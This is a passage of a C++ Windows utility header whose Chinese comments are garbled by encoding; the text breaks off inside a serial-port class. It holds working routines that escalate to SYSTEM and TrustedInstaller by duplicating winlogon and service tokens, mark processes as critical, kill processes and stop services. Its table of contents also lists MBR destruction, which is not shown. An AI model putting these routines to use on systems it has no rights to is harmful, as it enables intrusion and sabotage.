/**********************************************************
@brief: 			 xbebhxx3�����ϼ�
@license: 	         GPLv3
@version:  	         9.0
@remarks:            ����ʱ�� -std=gnu++11 -lgdi32 -lwsock32
@author:             xbehxx3
@date:               2022/3/28
@file:               x3-f.h
@copyright           Copyright (c) 2022 xbebhxx3, All Rights Reserved
***************************************/
//�ܲ�Ҫɾ��ע����������QwQ
//             ����       ����
//            �����ߩ����������������ߩ�
//            ��     ?     ��
//            ��  �ש�    ���� ��
//            ��     ��     ��
//            ������       ������
//              ��       ����������������������������
//              ��           ���ޱ���  �ǩ�
//              ��       xbebhxx3       ��
//              ��   ����BUG��         ����
//              �����������ש������������������������ש�����
//               ���ϩ� ���ϩ�      ���ϩ� ���ϩ�
//               ���ߩ� ���ߩ�      ���ߩ� ���ߩ�

/*****************Ŀ¼*********************
x3-f.h
|- Ȩ�޲���
|	 |- ���debugȨ��
|	 |- �жϹ���ԱȨ��
|	 |- ��ù���ԱȨ��
|	 |- ���TrustedInstallerȨ��
|	 |- ��systemȨ�޴򿪿�ִ���ļ�
|	 |- ��TrustedInstallerȨ�޴򿪿�ִ���ļ�
|- ���̲���
|   |- ��������
|   |- �жϽ����Ƿ���� ,�����ؽ���id
|   |- ��ý���·��
|   |- �������
|   |- ����/����ؼ�����
|   |- ֹͣ����
|   |- ��������
|   |- �г����з���
|- ���ڲ���
|    |- �򿪴���
|    |- �رմ���
|    |- ��������
|    |- ��������
|- ע�������
|     |- ��ע���
|     |- дע���
|     |- ɾ��ע�����
|     |- ɾ��ע���ֵ
|     |- ���ÿ�������
|- ��/�������
|	   |- Url����
|	   |- Url����
|	   |- ����
|- �ı���ɫ
|    |- RGB��ʼ��
|    |- RGB����
|- ����������
|- ������λ��
|- ����
|- strɾ���ո�
|- ��õ�ǰip
|- ��õ�ǰ�û���
|- ���ϵͳ�汾
|- ִ��cmd�����÷���ֵ
|- �������
|- ���ش���
|- �桤ȫ��
|- ���ش���
|- �ƻ�mbr

 ****************************************/

//ģ��
/*********************************************
 *  @Sample usage   ʹ��ʵ��
 *  @brief           ����
 *  @param           ��������
 *  @return          ��������ֵ����
 *  @exception       �������쳣����
 *  @warning         ����ʹ������Ҫע��ĵط�
 *  @calls           �����õĺ���
 *  @remarks         ��ע
 *  @note            ��ϸ����
 *  @author          xbebhxx3
 *  @version         �汾��
 *  @date            ����
 *  @copyright       Copyright (c) 2022 by xbebhxx3, All Rights Reserved
 **********************************************/

#include <Windows.h>
#include <TlHelp32.h>
#include <string>
#include <bits/stdc++.h> //û��ʵ�����ã�ֻ�����ô򲿷�ͷ�ļ�
#ifndef CIRCLE_H
#define CIRCLE_H

using namespace std;

//Ȩ�޲�����ʼ

/**************************************************
 *  @brief         ���debugȨ��
 *  @Sample usage  Debug();
 *  @return        1�ɹ���0ʧ��
 *  @author        xbebhxx3
 *  @version       1.0
 *  @date          2021/1/13
 *  @copyright     Copyright (c) 2022 by xbebhxx3, All Rights Reserved
 **************************************************/
BOOL Debug()
{
	HANDLE hToken;
	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &hToken)) //�򿪵�ǰ����
		return 0;
	//����Ȩ��
	LUID luid;
	if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luid)) //����Ȩ��
		return 0;
	TOKEN_PRIVILEGES tkp;
	tkp.PrivilegeCount = 1;
	tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	tkp.Privileges[0].Luid = luid;
	if (!AdjustTokenPrivileges(hToken, 0, &tkp, sizeof(tkp), NULL, NULL)) //�ж��Ƿ�ɹ�
		return 0;
	return 1;
}

/**************************************************
 *  @brief         �жϹ���ԱȨ��
 *  @return        1����Ա��0����
 *  @note          ͷ�ļ��� #include <Windows.h>
 *  @Sample usage  IsProcessRunAsAdmin();
 *  @author        xbebhxx3
 *  @version       2.0
 *  @date          2022/3/28
 *  @copyright     Copyright (c) 2022 by xbebhxx3, All Rights Reserved
 **************************************************/
bool IsProcessRunAsAdmin()
{
	BOOL bElevated = FALSE;
	HANDLE hToken = NULL;
	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) //�򿪽���
		return FALSE;
	//��ý���token
	TOKEN_ELEVATION tokenEle;
	DWORD dwRetLen = 0;
	if (GetTokenInformation(hToken, TokenElevation, &tokenEle, sizeof(tokenEle), &dwRetLen)) //��ý���token
		if (dwRetLen == sizeof(tokenEle))													 //�ж�
			bElevated = tokenEle.TokenIsElevated;

	CloseHandle(hToken);
	return bElevated; //����
}

/**************************************************
 *  @brief         ��ù���ԱȨ��
 *  @return        1�Ѿ��ǹ���Ա
 *  @note          ͷ�ļ��� #include <Windows.h>
 *  @Sample usage  RunAsAdmin();
 *  @Calls         IsProcessRunAsAdmin
 *  @remarks       ��������IsProcessRunAsAdmin�ж��Ƿ�Ϊ����ԱȨ��
 *  @author        xbebhxx3
 *  @version       1.0
 *  @date          2022/3/28
 *  @copyright     Copyright (c) 2022 by xbebhxx3, All Rights Reserved
 **************************************************/
bool RunAsAdmin()
{
	if (IsProcessRunAsAdmin() == 1) //�ж��Ƿ��ǹ���Ա����ֹѭ������
		return 1;

	char szFilePath[MAX_PATH + 1] = {0};
	GetModuleFileNameA(NULL, szFilePath, MAX_PATH); //��õ�ǰ�ļ�·��

	ShellExecute(NULL, "runas", szFilePath, NULL, NULL, SW_SHOW); //�ù���ԱȨ�޴�
	exit(0);													  //�˳���ǰ���̣���ֹ����2������
}

/**************************************************
 *  @brief         ���TrustedInstallerȨ��
 *  @return        1�Ѿ���TrustedInstaller
 *  @note          ͷ�ļ��� #include <Windows.h>
 *  @Sample usage  RunAsTi();
 *  @Calls         IsProcessRunAsAdmin,UseTrustedInstaller,GetUser
 *  @remarks       ��������IsProcessRunAsAdmin�ж��Ƿ�Ϊ����ԱȨ�� ��������UseTrustedInstaller��Ȩ ��������GetUser�жϵ�ǰ�û���
 *  @author        xbebhxx3
 *  @version       1.0
 *  @date          2022/9/7
 *  @copyright     Copyright (c) 2022 by xbebhxx3, All Rights Reserved
 **************************************************/
string GetUser();
bool UseTrustedInstaller(const char *exec);
bool RunAsTi()
{
	RunAsAdmin(); //�Թ���ԱȨ�����У�UseTrustedInstaller��Ҫ����ԱȨ��

	if (GetUser() != "SYSTEM") //�ж��Ƿ���SYSTEMȨ��,��ֹѭ������
	{
		char szFilePath[MAX_PATH + 1] = {0};
		GetModuleFileNameA(NULL, szFilePath, MAX_PATH); //��õ�ǰ�ļ�·��
		UseTrustedInstaller(szFilePath);				//��TrustedInstallerȨ�޴�
		exit(0);										//�˳���ֹ2������
	}
	else
		return 1;
}

/**************************************************
 *  @brief         ��systemȨ�޴򿪿�ִ���ļ�
 *  @return        1�ɹ�,0ʧ��
 *  @note          ͷ�ļ��� #include <Windows.h>
 *  @calls          Debug
 *  @Sample usage  UseSystem("cmd");
 *  @author        xbebhxx3
 *  @version       1.0
 *  @date          2022/3/28
 *  @copyright     Copyright (c) 2022 by xbebhxx3, All Rights Reserved
 **************************************************/
int isProcess(const char *szImageName);
bool UseSystem(const char *exec)
{
	int num = MultiByteToWideChar(0, 0, exec, -1, NULL, 0);
	wchar_t *wexec = new wchar_t[num];
	MultiByteToWideChar(0, 0, exec, -1, wexec, num); // char *תwchar_t

	DWORD PID_TO_IMPERSONATE = isProcess("winlogon.exe"); //���winlogon.exe��pid
	//����֮����Ҫ�ı���
	HANDLE tokenHandle = NULL;			//��������
	HANDLE duplicateTokenHandle = NULL; //���Ƶ�����

	STARTUPINFO startupInfo; //��������������Ľṹ
	PROCESS_INFORMATION processInformation;
	ZeroMemory(&startupInfo, sizeof(STARTUPINFO));
	ZeroMemory(&processInformation, sizeof(PROCESS_INFORMATION));
	startupInfo.cb = sizeof(STARTUPINFO);

	BOOL getCurrentToken = OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, NULL); //��ȡ������е���Ȩ��

	Debug(); //���debugȨ��

	HANDLE processHandle = OpenProcess(PROCESS_QUERY_INFORMATION, true, PID_TO_IMPERSONATE); // ��ȡָ�����̵ľ��

	if (!processHandle)
		OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, true, PID_TO_IMPERSONATE); //�ƹ���΢���Ľ��̱���

	OpenProcessToken(processHandle, TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY, &tokenHandle); // ��ȡָ�����̵ľ������

	if (ImpersonateLoggedOnUser(tokenHandle)) //ģ���¼�û��İ�ȫ������
		RevertToSelf();
	DuplicateTokenEx(tokenHandle, TOKEN_ADJUST_DEFAULT | TOKEN_ADJUST_SESSIONID | TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY, NULL, SecurityImpersonation, TokenPrimary, &duplicateTokenHandle); // ���ƾ���SYSTEMȨ�޵�����

	return CreateProcessWithTokenW(duplicateTokenHandle, LOGON_WITH_PROFILE, wexec, NULL, 0, NULL, NULL, (LPSTARTUPINFOW)&startupInfo, &processInformation); // ����ָ�����������Ľ���
}

/**************************************************
 *  @brief         ��TrustedInstallerȨ�޴򿪿�ִ���ļ�
 *  @return        1�ɹ�,0ʧ��
 *  @note          ͷ�ļ��� #include <Windows.h>
 *  @Sample usage  UseTrustedInstaller("cmd");
 *  @calls          Debug
 *  @remarks       ����ʱ�� -std=gnu++11
 *  @author        xbebhxx3
 *  @version       5.0
 *  @date          2022/8/10
 *  @copyright     Copyright (c) 2022 by xbebhxx3, All Rights Reserved
 **************************************************/
bool UseTrustedInstaller(const char *exec)
{
	int num = MultiByteToWideChar(0, 0, exec, -1, NULL, 0);
	wchar_t *wexec = new wchar_t[num];
	MultiByteToWideChar(0, 0, exec, -1, wexec, num); // char *תwchar_t

	Debug(); //���debugȨ��

	HANDLE hSystemToken = nullptr, IhDupToken = nullptr, hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); //�������̿���
	PROCESSENTRY32W pe = {0};
	pe.dwSize = sizeof(PROCESSENTRY32W);
	Process32FirstW(hSnapshot, &pe);
	while (Process32NextW(hSnapshot, &pe) && _wcsicmp(pe.szExeFile, L"winlogon.exe"))
		;																																	//��ǰ������winlogon.exe
	OpenProcessToken(OpenProcess(PROCESS_DUP_HANDLE | PROCESS_QUERY_INFORMATION, FALSE, pe.th32ProcessID), MAXIMUM_ALLOWED, &hSystemToken); // ��ȡָ�����̵ľ������
	SECURITY_ATTRIBUTES ItokenAttributes;
	ItokenAttributes.nLength = sizeof(SECURITY_ATTRIBUTES);
	ItokenAttributes.lpSecurityDescriptor = nullptr;
	ItokenAttributes.bInheritHandle = FALSE;
	DuplicateTokenEx(hSystemToken, MAXIMUM_ALLOWED, &ItokenAttributes, SecurityImpersonation, TokenImpersonation, &IhDupToken); //������
	ImpersonateLoggedOnUser(IhDupToken);																						//��������������Ľṹ
	//����֮����Ҫ�ı���
	HANDLE hTIProcess = nullptr, hTIToken = nullptr, hDupToken = nullptr;
	HANDLE hToken = nullptr;
	LPVOID lpEnvironment = nullptr;
	LPWSTR lpBuffer = nullptr;
	SC_HANDLE hSCManager = nullptr;
	SC_HANDLE hService = nullptr;
	DWORD dwProcessId = 0;
	BOOL res = TRUE, started = TRUE;
	//����TrustedInstaller���񲢻��id
	hSCManager = OpenSCManager(nullptr, SERVICES_ACTIVE_DATABASE, GENERIC_EXECUTE);
	hService = OpenServiceW(hSCManager, L"TrustedInstaller", GENERIC_READ | GENERIC_EXECUTE); //��TrustedInstaller����
	SERVICE_STATUS_PROCESS statusBuffer = {0};
	DWORD bytesNeeded;
	while (dwProcessId == 0 && started && (res = QueryServiceStatusEx(hService, SC_STATUS_PROCESS_INFO, reinterpret_cast<LPBYTE>(&statusBuffer), sizeof(SERVICE_STATUS_PROCESS), &bytesNeeded)))
	{
		switch (statusBuffer.dwCurrentState)
		{
		case SERVICE_STOPPED:
			started = StartServiceW(hService, 0, nullptr); //����TrustedInstaller����
		case SERVICE_STOP_PENDING:
			Sleep(statusBuffer.dwWaitHint); //�ȴ���������
		case SERVICE_RUNNING:
			dwProcessId = statusBuffer.dwProcessId; //��ֵ����id
		}
	}

	hTIProcess = OpenProcess(PROCESS_DUP_HANDLE | PROCESS_QUERY_INFORMATION, FALSE, dwProcessId); //��TrustedInstaller����
	OpenProcessToken(hTIProcess, MAXIMUM_ALLOWED, &hTIToken);									  //���TrustedInstaller����Token

	SECURITY_ATTRIBUTES tokenAttributes;
	tokenAttributes.nLength = sizeof(SECURITY_ATTRIBUTES);
	tokenAttributes.lpSecurityDescriptor = nullptr;
	tokenAttributes.bInheritHandle = FALSE;
	DuplicateTokenEx(hTIToken, MAXIMUM_ALLOWED, &tokenAttributes, SecurityImpersonation, TokenImpersonation, &hDupToken); //���ƴ���TrustedInstallerȨ�޵�����
	OpenProcessToken(GetCurrentProcess(), TOKEN_READ, &hToken);															  // ��ȡָ�����̵ľ��

	DWORD nBufferLength = GetCurrentDirectoryW(0, nullptr);
	lpBuffer = (LPWSTR)(new wchar_t[nBufferLength]{0});
	GetCurrentDirectoryW(nBufferLength, lpBuffer); //�������ϵͳ·��

	STARTUPINFOW startupInfo;
	ZeroMemory(&startupInfo, sizeof(STARTUPINFOW));
	startupInfo.lpDesktop = (LPWSTR)L"Winsta0\\Default";
	PROCESS_INFORMATION processInfo;
	ZeroMemory(&processInfo, sizeof(PROCESS_INFORMATION));

	return CreateProcessWithTokenW(hDupToken, LOGON_WITH_PROFILE, nullptr, wexec, CREATE_UNICODE_ENVIRONMENT, lpEnvironment, lpBuffer, &startupInfo, &processInfo); //��
}

//Ȩ�޲�������

//���̲�����ʼ

/**************************************************
 *  @brief          ��������
 *  @param          szImageName:������
 *  @note           ͷ�ļ��� #include <Windows.h> #include <TlHelp32.h> #include <string>
 *  @Sample usage 	KillProcess("cmd.exe");
 *  @author         xbebhxx3
 *  @version        2.0
 *  @date           2022/3/15
 *  @copyright      Copyright (c) 2022 by xbebhxx3, All Rights Reserved
 **************************************************/
void KillProcess(const char *szImageName)
{
	PROCESSENTRY32 pe = {sizeof(PROCESSENTRY32)};					   //��ý����б�
	HANDLE hProcess = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); //�������
	BOOL bRet = Process32First(hProcess, &pe);						   //���������е�һ��������Ϣ

	while (bRet)
	{ //�жϲ������һ�����̣���������
		if (lstrcmp(szImageName, pe.szExeFile) == 0)
		{																				   //�ж��ǲ���Ҫ�����Ľ���
			TerminateProcess(OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe.th32ProcessID), 0); //�򿪽��̲�ɱ��
		}
		bRet = Process32Next(hProcess, &pe); //��һ������
	}
	return;
}

/**************************************************
 *  @brief          �жϽ����Ƿ���� ,�����ؽ���id
 *  @param          szImageName:������
 *  @note           ͷ�ļ��� #include <Windows.h> #include <TlHelp32.h> #include <string>
 *  @Sample usage 	isProcess("cmd.exe");
 * 	@return         0������ ��0Ϊ����id
 * 	@author         xbebhxx3
 * 	@version        1.0
 * 	@date           2022/3/15
 *  @copyright      Copyright (c) 2022 by xbebhxx3, All Rights Reserved
 **************************************************/
int isProcess(const char *szImageName)
{
	PROCESSENTRY32 pe = {sizeof(PROCESSENTRY32)};					   //��ý����б�
	HANDLE hProcess = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); //�������
	BOOL bRet = Process32First(hProcess, &pe);						   //���������е�һ��������Ϣ

	while (bRet)
	{ //�������һ�����̣���������
		if (lstrcmp(szImageName, pe.szExeFile) == 0)
			return pe.th32ProcessID;		 //���ؽ���id
		bRet = Process32Next(hProcess, &pe); //��һ������
	}
	return 0;
}

/**************************************************
 *  @brief          ��ý���·��
 *  @param          szImageName:������
 *  @note           ͷ�ļ��� #include <Windows.h> #include <TlHelp32.h> #include <string>
 *  @Sample usage   GetProcesslocation("cmd.exe");
 * 	@return  	    0������ ��0Ϊ����λ��
 *  @calls          isProcess
 * 	@author         xbebhxx3
 * 	@version        1.0
 * 	@date           2022/5/18
 *  @copyright      Copyright (c) 2022 by xbebhxx3, All Rights Reserved
 **************************************************/
string GetProcesslocation(const char *szImageName)
{
	if (isProcess(szImageName) == 0)
		return "0";
	HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); // �������̿���
	PROCESSENTRY32 process = {sizeof(PROCESSENTRY32)};					   // �������� hProcessSnap ����Ϣ
	while (Process32Next(hProcessSnap, &process))
	{											// �������̿���
		string processName = process.szExeFile; // char* ת string
		if (processName == szImageName)			// �ҵ�����
		{
			//��ý���·��
			PROCESSENTRY32 *pinfo = new PROCESSENTRY32;		//������Ϣ ��pinfo->dwSize = sizeof(PROCESSENTRY32);��
			MODULEENTRY32 *minfo = new MODULEENTRY32;		//ģ����Ϣ ��minfo->dwSize = sizeof(MODULEENTRY32);��
			char shortpath[MAX_PATH];						//����·������
			int flag = Process32First(hProcessSnap, pinfo); // �ӵ�һ�����̿�ʼ
			while (flag)
			{
				if (strcmp(pinfo->szExeFile, szImageName) == 0)
				{																						// ������������
					HANDLE hModule = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, pinfo->th32ProcessID); // �������̿���
					Module32First(hModule, minfo);														// �ѵ�һ��ģ����Ϣ�� minfo
					GetShortPathName(minfo->szExePath, shortpath, 256);									// ���ļ�·���� shortpath
					break;
				}
				flag = Process32Next(hProcessSnap, pinfo); // ��һ������
			}
			return shortpath;
			break;
		}
	}
}

/**************************************************
 *  @brief          �������
 *  @param          dwProcessID:����ID,fSuspend: TRUE����,FALSE���
 *  @note           ͷ�ļ��� #include <Windows.h> #include <TlHelp32.h>
 *  @Sample usage   SuspendProcess(isProcess("cmd.exe"),1);
 *  @calls          Debug
 * 	@return     	1�ɹ���0 ʧ��
 * 	@author         xbebhxx3
 * 	@version        1.0
 * 	@date           2022/5/18
 *  @copyright      Copyright (c) 2022 by xbebhxx3, All Rights Reserved
 **************************************************/
bool SuspendProcess(DWORD dwProcessID, BOOL fSuspend)
{
	bool ret = 1;

	Debug(); //���debugȨ��

	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, dwProcessID); //��ý��̿���
	if (hSnapshot != INVALID_HANDLE_VALUE)										 //���̴���
	{
		THREADENTRY32 te = {sizeof(te)};
		BOOL fOk = Thread32First(hSnapshot, &te);		//�򿪽���
		for (; fOk; fOk = Thread32Next(hSnapshot, &te)) //��ǰ�����һ�����̣���һ��
			if (te.th32OwnerProcessID == dwProcessID)
			{
				if (fSuspend)
				{
					if (SuspendThread(OpenThread(THREAD_SUSPEND_RESUME, FALSE, te.th32ThreadID)) == -1) //����
						ret = 0;
				}
				else
				{
					if (ResumeThread(OpenThread(THREAD_SUSPEND_RESUME, FALSE, te.th32ThreadID)) == -1) //ȡ������
						ret = 0;
				}
			}
		CloseHandle(OpenThread(THREAD_SUSPEND_RESUME, FALSE, te.th32ThreadID)); //�رտ���
	}
	CloseHandle(hSnapshot); //�رտ���
	return ret;
}

/**************************************************
 *  @brief          ����/����ؼ�����
 *  @param          id:����id ,fSuspend:1�ؼ���0��ͨ
 *  @note           ͷ�ļ��� #include <Windows.h> #include <TlHelp32.h>
 *  @Sample usage 	CriticalProcess(1000,1);
 * 	@return      	1�ɹ���0ʧ��
 *  @calls          Debug
 * 	@author         xbebhxx3
 * 	@version        1.0
 * 	@date           2022/3/28
 *  @copyright      Copyright (c) 2022 by xbebhxx3, All Rights Reserved
 **************************************************/
typedef NTSTATUS(NTAPI *_NtSetInformationProcess)(HANDLE ProcessHandle, PROCESS_INFORMATION_CLASS ProcessInformationClass, PVOID ProcessInformation, ULONG ProcessInformationLength);
bool CriticalProcess(DWORD dwProcessID, BOOL fSuspend)
{
	Debug(); //���debugȨ��

	_NtSetInformationProcess NtSetInformationProcess = (_NtSetInformationProcess)GetProcAddress(GetModuleHandleA("NtDll.dll"), "NtSetInformationProcess"); //����ntdll
	if (!NtSetInformationProcess)																														   //����ʧ�ܣ��˳�
		return 0;
	if (NtSetInformationProcess(OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcessID), (PROCESS_INFORMATION_CLASS)29, &fSuspend, sizeof(ULONG)) < 0) //���ý���
		return 0;																																   //����ʧ�ܣ��˳�
	else
		return 1;
}

/**************************************************
 *  @brief          ֹͣ����
 *  @param          ������
 *  @note           ͷ�ļ��� #include <Windows.h>
 *  @Sample usage 	CloseService("CryptSvc");
 * 	@return  	    1�ɹ���0ʧ��
 * 	@author         xbebhxx3
 * 	@version        1.0
 * 	@date           2022/9/7
 *  @copyright      Copyright (c) 2022 by xbebhxx3, All Rights Reserved
 **************************************************/
bool CloseService(char *service)
{
	SC_HANDLE hSC = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS); //�򿪷��������
	if (hSC == NULL)
		return false;

	SC_HANDLE hSvc = OpenService(hSC, service, SERVICE_START | SERVICE_QUERY_STATUS | SERVICE_STOP); //�򿪷���
	if (hSvc == NULL)
	{
		CloseServiceHandle(hSC);
		return false; //�򿪷��������ʧ�ܣ��ر�HANDLE�˳�
	}
	SERVICE_STATUS status;
	if (QueryServiceStatus(hSvc, &status) == FALSE) //��÷���״̬
	{
		CloseServiceHandle(hSvc);
		CloseServiceHandle(hSC);
		return false; //��ѯ����״̬ʧ�ܣ��ر�HANDLE�˳�
	}
	if (status.dwCurrentState == SERVICE_RUNNING) //����������У�ֹͣ����
	{
		if (ControlService(hSvc, SERVICE_CONTROL_STOP, &status) == FALSE)
		{
			CloseServiceHandle(hSvc);
			CloseServiceHandle(hSC);
			return false; //ֹͣ����ʧ�ܣ��ر�HANDLE�˳�
		}
		while (QueryServiceStatus(hSvc, &status) == TRUE) //�ȴ�����ֹͣ
		{
			Sleep(status.dwWaitHint);
			if (status.dwCurrentState == SERVICE_STOPPED) //�����Ѿ�ֹͣ
			{
				CloseServiceHandle(hSvc);
				CloseServiceHandle(hSC);
				return true; //������ֹͣ���ر�HANDLE�˳�
			}
		}
	}

	CloseServiceHandle(hSvc);
	CloseServiceHandle(hSC);
	return true; //������ֹͣ���ر�HANDLE�˳�
}

/**************************************************
 *  @brief          ��������
 *  @param          ������
 *  @note           ͷ�ļ��� #include <Windows.h>
 *  @Sample usage 	StartService("CryptSvc");
 * 	@return  	    1�ɹ���0ʧ��
 * 	@author         xbebhxx3
 * 	@version        1.0
 * 	@date           2022/9/8
 *  @copyright      Copyright (c) 2022 by xbebhxx3, All Rights Reserved
 **************************************************/
bool StartService(char *service)
{
	SC_HANDLE hSC = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS); //�򿪷��������
	if (hSC == NULL)
		return false;

	SC_HANDLE hSvc = OpenService(hSC, service, SERVICE_START | SERVICE_QUERY_STATUS | SERVICE_STOP); //�򿪷���
	if (hSvc == NULL)
	{
		CloseServiceHandle(hSC);
		return false; //�򿪷��������ʧ�ܣ��ر�HANDLE�˳�
	}
	SERVICE_STATUS status;
	if (QueryServiceStatus(hSvc, &status) == FALSE) //��÷���״̬
	{
		CloseServiceHandle(hSvc);
		CloseServiceHandle(hSC);
		return false; //��ѯ����״̬ʧ�ܣ��ر�HANDLE�˳�
	}
	if (status.dwCurrentState != SERVICE_RUNNING) //���δ���У���������
	{
		if (StartService(hSvc, NULL, NULL) == FALSE)
		{
			CloseServiceHandle(hSvc);
			CloseServiceHandle(hSC);
			return false; //��������ʧ�ܣ��ر�HANDLE�˳�
		}

		while (QueryServiceStatus(hSvc, &status) == TRUE) // �ȴ���������
		{
			Sleep(status.dwWaitHint);
			if (status.dwCurrentState == SERVICE_RUNNING) //�����Ѿ�����
			{
				CloseServiceHandle(hSvc);
				CloseServiceHandle(hSC);
				return true; //�������������ر�HANDLE�˳�
			}
		}
	}

	CloseServiceHandle(hSvc);
	CloseServiceHandle(hSC);
	return true; //�������������ر�HANDLE�˳�
}

/**************************************************
 *  @brief          �г����з���
 *  @param          ������
 *  @note           ͷ�ļ��� #include <Windows.h>
 *  @Sample usage 	ListService();
 * 	@author         xbebhxx3
 * 	@version        1.0
 * 	@date           2022/9/8
 *  @copyright      Copyright (c) 2022 by xbebhxx3, All Rights Reserved
 **************************************************/
void ListService()
{
	SC_HANDLE SCMan = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
	if (SCMan == NULL)
		return;
	LPENUM_SERVICE_STATUS service_status;
	DWORD cbBytesNeeded = NULL;
	DWORD ServicesReturned = NULL;
	DWORD ResumeHandle = NULL;

	service_status = (LPENUM_SERVICE_STATUS)LocalAlloc(LPTR, 65536);

	BOOL ESS = EnumServicesStatus(SCMan, //���
								  SERVICE_DRIVER |
									  SERVICE_FILE_SYSTEM_DRIVER |
									  SERVICE_KERNEL_DRIVER |
									  SERVICE_WIN32 |
									  SERVICE_WIN32_OWN_PROCESS |
									  SERVICE_WIN32_SHARE_PROCESS,		 //��������
								  SERVICE_STATE_ALL,					 //�����״̬
								  (LPENUM_SERVICE_STATUS)service_status, //���������ϵͳ����Ľṹ
								  65536,								 //�ṹ�Ĵ�С
								  &cbBytesNeeded,						 //������������շ�������ķ���
								  &ServicesReturned,					 //������������շ��ط��������
								  &ResumeHandle);						 //���������������һ�ε��ñ���Ϊ0������Ϊ0�����ɹ�
	if (ESS == NULL)
		return;
	for (int i = 0; i < static_cast<int>(ServicesReturned); i++)
	{
		printf("������ʾ��:%s\n", service_status[i].lpDisplayName);
		printf("\t������:%s\n", service_status[i].lpServiceName);

		printf("\t����:");
		switch (service_status[i].ServiceStatus.dwServiceType)
		{ // ����״̬
		case SERVICE_FILE_SYSTEM_DRIVER:
			printf("�ļ�ϵͳ��������\n");
			break;
		case SERVICE_KERNEL_DRIVER:
			printf("�豸��������\n");
			break;
		case SERVICE_WIN32_OWN_PROCESS:
			printf("�����Լ��Ľ���������\n");
			break;
		case SERVICE_WIN32_SHARE_PROCESS:
			printf("������������һ������\n");
			break;
		case 0x00000050:
			printf("�����Լ��Ľ���������\n");
			break;
		case 0x00000060:
			printf("�ڵ�¼�û��ʻ������е�һ����������������һ������\n");
			break;
		case SERVICE_INTERACTIVE_PROCESS:
			printf("���������潻��\n");
			break;
		default:
			printf("δ֪\n");
			break;
		}

		printf("\t״̬:");
		switch (service_status[i].ServiceStatus.dwCurrentState)
		{ // ����״̬
		case SERVICE_CONTINUE_PENDING:
			printf("��������\n");
			break;
		case SERVICE_PAUSE_PENDING:
			printf("������ͣ\n");
			break;
		case SERVICE_PAUSED:
			printf("����ͣ\n");
			break;
		case SERVICE_RUNNING:
			printf("��������\n");
			break;
		case SERVICE_START_PENDING:
			printf("��������\n");
			break;
		case SERVICE_STOP_PENDING:
			printf("����ֹͣ\n");
			break;
		case SERVICE_STOPPED:
			printf("��ֹͣ\n");
			break;
		default:
			printf("δ֪\n");
			break;
		}
		LPQUERY_SERVICE_CONFIG lpServiceConfig = NULL;												//������ϸ��Ϣ�ṹ
		SC_HANDLE service_curren = NULL;															//��ǰ�ķ�����
		service_curren = OpenService(SCMan, service_status[i].lpServiceName, SERVICE_QUERY_CONFIG); //�򿪵�ǰ����
		lpServiceConfig = (LPQUERY_SERVICE_CONFIG)LocalAlloc(LPTR, 8192);							//�����ڴ棬 ���Ϊ8kb

		if (NULL == QueryServiceConfig(service_curren, lpServiceConfig, 8192, &ResumeHandle))
			return;
		printf("\t��������:%s\n", lpServiceConfig->lpBinaryPathName);
		CloseServiceHandle(service_curren);
	}
	CloseServiceHandle(SCMan);
}

//���̲�������

//���ڲ�����ʼ

/**************************************************
 *  @brief         ���ڲ���
 *  @Sample usage
	SerialPort w;//ʹ�ã����Ǳ�����w
	w.open("\\\\.\\COM7");//��COM7 ���Ǳ�����COM7
	w.close()//�ر�
	w.send("at\r");//����
	w.receive()��//����
 *  @note           ͷ�ļ��� #include <Windows.h>
 * 	@author         xbebhxx3
 * 	@version        5.0
 * 	@date           2022/8/12
 *  @copyright      Copyright (c) 2022 by xbebhxx3, All Rights Reserved
**************************************************/
class SerialPort
{
public:
	SerialPort();
	~SerialPort();
	bool open(const char *portname, int baudrate, char parity, char databit, char stopbit, char synchronizeflag); // �򿪴���,�ɹ�����true��ʧ�ܷ���false
	void close();																								  //�رմ���
	int send(string dat);																						  //�������ݻ�д���ݣ��ɹ����ط������ݳ��ȣ�ʧ�ܷ���0
	string receive();																							  //�������ݻ�����ݣ��ɹ����ض�ȡʵ�����ݵĳ��ȣ�ʧ�ܷ���0
private:
	int pHandle[16];
	char synchronizeflag;
};
SerialPort::SerialPort() {}
SerialPort::~SerialPort() {}
/**************************************************
 *  @brief          �򿪴���
 *  @param
	portname(������): ��Windows����"COM1""COM2"�ȣ���Linux����"/dev/ttyS1"��
	baudrate(������): 9600��19200��38400��43000��56000��57600��115200
	parity(У��λ): 0Ϊ��У�飬1Ϊ��У�飬2ΪżУ�飬3Ϊ���У��
	databit(����λ): 4-8��ͨ��Ϊ8λ
	stopbit(ֹͣλ): 1Ϊ1λֹͣλ��2Ϊ2λֹͣλ,3Ϊ1.5λֹͣλ
	synchronizable(ͬ�����첽): 0Ϊ�첽��1Ϊͬ��
 *  @note           �Ƕ���ģ��
 *  @Sample usage 	open(�˿ں�);
 * 	@return         �ɹ�����true��ʧ�ܷ���false
 * 	@author         xbebhxx3
 * 	@version        2.0
 * 	@date           2022/8/13
 *  @copyright      Copyright (c) 2022 by xbebhxx3, All Rights Reserved
**************************************************/
bool SerialPort::open(const char *portname, int baudrate = 115200, char parity = 0, char databit = 8, char stopbit = 1, char synchronizeflag = 1)
{
	this->synchronizeflag = synchronizeflag;
	HANDLE hCom = NULL;
	if (this->synchronizeflag)
		hCom = CreateFileA(portname, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL); //ͬ����ʽ
	else
